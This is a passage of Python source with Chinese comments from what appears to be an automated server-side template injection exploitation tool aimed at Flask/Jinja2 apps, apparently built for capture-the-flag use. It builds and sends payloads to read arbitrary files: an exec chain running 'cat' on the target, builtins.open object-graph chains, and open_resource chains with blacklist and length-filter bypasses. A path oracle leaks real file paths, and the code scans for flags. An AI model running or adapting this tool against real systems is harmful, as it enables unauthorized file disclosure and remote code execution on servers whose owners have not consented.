        # 阶段 1: exec 链 cat 兜底（RCE 可达时最可靠）
        report.append("[read] 阶段 1: 尝试 exec 链 cat（RCE 可达时最可靠）")
        exec_data = await self._run_exec(http, baseline, f"cat {file_path}", report, pacer,
                                         signals, blocked_words, max_length, quiet_guidance=True)
        if exec_data.get("success"):
            return {"success": True, "method": "exec-cat", "chain": exec_data["chain"],
                    "content": exec_data["output"], "tried": exec_data.get("tried")}

        # max_length 单独启用时也走自适应（拆片路径与空格括号变体在无黑名单目标上
        # 语义等价，且只有紧凑形式才可能满足长度上限）
        adaptive = bool(blocked_words) or bool(signals & {"blocked", "too_long"}) or max_length > 0
        if adaptive:
            report.append("[read] 检测到黑名单/长度过滤 → CaaS1 式自适应阶梯（open_resource 优先）")
            data = await self._read_open_resource(http, baseline, file_path, report, pacer,
                                                  signals, blocked_words, max_length, blocked=True)
            if data:
                return data
            data = await self._read_builtins(http, baseline, file_path, report, pacer,
                                             signals, max_length)
            if data:
                return data
        else:
            data = await self._read_builtins(http, baseline, file_path, report, pacer,
                                             signals, max_length)
            if data:
                return data
            data = await self._read_open_resource(http, baseline, file_path, report, pacer,
                                                  signals, blocked_words, max_length, blocked=False)
            if data:
                return data
        return {"success": False, "method": None, "content": None}

    # —— 阶段 2：builtins.open 对象图读取 ——
    async def _read_builtins(self, http: _Http, baseline: str, file_path: str,
                             report: list[str], pacer: _Pacer, signals: set[str],
                             max_length: int) -> dict | None:
        marker = _rand_marker()
        tried: list[dict] = []
        path_expr = _quote(file_path)

        async def attempt_read(label: str, payload: str) -> str | None:
            if not _fits(payload, max_length):
                tried.append({"label": label, "class": "skipped", "len": len(payload),
                              "payload": payload})
                report.append(f"[read] {label} → 跳过（长度 {len(payload)} > 上限 {max_length}）")
                return None
            status, body = await pacer.send(http, payload)
            cls = _classify(body, baseline, status)
            if cls in ("blocked", "too_long", "rate_limit"):
                signals.add(cls)
            tried.append({"label": label, "class": cls, "status": status, "len": len(payload),
                          "payload": payload})
            report.append(f"[read] {label}（{len(payload)} 字符）→ HTTP {status} 判定={cls}")
            report.append(_poc_line(payload))
            if cls != "ok":
                return None
            out = _extract_between(body, marker) or _excerpt(body)
            report.append(f"  └─ 内容: {out[:500]}")
            return out

        report.append("[read] 阶段 2: builtins.open 对象图读取")
        for entry, ge in ENTRY_CHAINS.items():
            for tpl in FILE_OPEN_TEMPLATES:
                payload = "{{" + tpl.replace("{entry}", ge).replace("{path}", path_expr) + "}}"
                out = await attempt_read(f"open 入口 {entry}", payload)
                if out:
                    flag = FLAG_RE.search(out)
                    return {"success": True, "method": "builtins.open", "chain": entry,
                            "content": out, "tried": tried,
                            "flag": flag.group(0) if flag else None}
            for tpl in FILE_ITER_TEMPLATES:
                payload = "{{" + tpl.replace("{entry}", ge).replace("{path}", path_expr) + "}}"
                out = await attempt_read(f"迭代器入口 {entry}", payload)
                if out:
                    flag = FLAG_RE.search(out)
                    return {"success": True, "method": "builtins.open+__next__", "chain": entry,
                            "content": out, "tried": tried,
                            "flag": flag.group(0) if flag else None}
        return None

    # —— 阶段 3：open_resource 链（黑名单场景主力）+ 路径 oracle ——
    async def _read_open_resource(self, http: _Http, baseline: str, file_path: str,
                                  report: list[str], pacer: _Pacer, signals: set[str],
                                  blocked_words: list[str], max_length: int,
                                  blocked: bool) -> dict | None:
        marker = _rand_marker()
        tried: list[dict] = []
        templates = OPEN_RESOURCE_READ_BLOCKED if blocked else OPEN_RESOURCE_READ
        smart = blocked
        path_exprs = _path_exprs(file_path, blocked_words, smart)

        async def attempt_read(label: str, payload: str) -> str | None:
            if not _fits(payload, max_length):
                tried.append({"label": label, "class": "skipped", "len": len(payload),
                              "payload": payload})
                report.append(f"[read] {label} → 跳过（长度 {len(payload)} > 上限 {max_length}）")
                return None
            status, body = await pacer.send(http, payload)
            cls = _classify(body, baseline, status)
            if cls in ("blocked", "too_long", "rate_limit"):
                signals.add(cls)
            tried.append({"label": label, "class": cls, "status": status, "len": len(payload),
                          "payload": payload})
            report.append(f"[read] {label}（{len(payload)} 字符）→ HTTP {status} 判定={cls}")
            report.append(_poc_line(payload))
            if cls != "ok":
                return None
            out = _extract_between(body, marker) or _excerpt(body)
            report.append(f"  └─ 内容: {out[:500]}")
            return out

        report.append("[read] 阶段 3: Flask open_resource（request.json_module._app）")
        for expr in path_exprs:
            for tpl in templates:
                payload = "{{" + tpl.replace("{path}", expr) + "}}"
                out = await attempt_read(f"open_resource[{expr}]", payload)
                if out:
                    flag = FLAG_RE.search(out)
                    return {"success": True, "method": "open_resource",
                            "chain": "request.json_module", "content": out, "tried": tried,
                            "flag": flag.group(0) if flag else None}

        # 阶段 4: 路径 oracle —— open 不读泄露真实路径 → 自动重读；并扫描常见 flag 路径
        report.append("[read] 阶段 4: 路径 oracle（open 不读 → repr 泄露真实路径）")
        candidates = [file_path] + [c for c in FLAG_CANDIDATES if c != file_path]
        leaked_paths: list[str] = []
        for cand in candidates:
            for expr in _path_exprs(cand, blocked_words, smart):
                payload = "{{" + OPEN_RESOURCE_ORACLE.replace("{path}", expr) + "}}"
                if not _fits(payload, max_length):
                    tried.append({"label": f"oracle[{expr}]", "class": "skipped", "len": len(payload),
                                  "payload": payload})
                    continue
                status, body = await pacer.send(http, payload)
                cls = _classify(body, baseline, status)
                if cls in ("blocked", "too_long", "rate_limit"):
                    signals.add(cls)
                tried.append({"label": f"oracle[{expr}]", "class": cls, "status": status,
                              "len": len(payload), "payload": payload})
                report.append(f"[read] oracle[{expr}]（{len(payload)} 字符）→ HTTP {status} 判定={cls}")
                report.append(_poc_line(payload))
                if cls != "ok":
                    continue
                m = PATH_IN_REPR.search(_html_unescape(body))
                if not m:
                    report.append("  └─ open 成功但未解析到路径（非文件对象响应）")
                    continue
                leaked = m.group(1)
                report.append(f"  └─ 泄露真实路径: {leaked}")
                if leaked in leaked_paths:
                    continue
                leaked_paths.append(leaked)
                # 自动用泄露路径重读
                for expr2 in _path_exprs(leaked, blocked_words, smart):
                    for tpl in templates:
                        payload2 = "{{" + tpl.replace("{path}", expr2) + "}}"
                        out = await attempt_read(f"open_resource[泄露路径 {expr2}]", payload2)
                        if out:
                            flag = FLAG_RE.search(out)
                            return {"success": True, "method": "open_resource+oracle",
                                    "chain": "request.json_module", "content": out,
                                    "leaked_path": leaked, "tried": tried,
                                    "flag": flag.group(0) if flag else None}
                report.append("  └─ 泄露路径重读未命中，继续扫描其他候选")
        if leaked_paths:
            return {"success": True, "method": "open_resource-oracle", "content": leaked_paths[0],
                    "leaked_paths": leaked_paths, "tried": tried,
                    "note": "已泄露路径但重读失败（可能 read/__next__ 也被封）"}
        return None
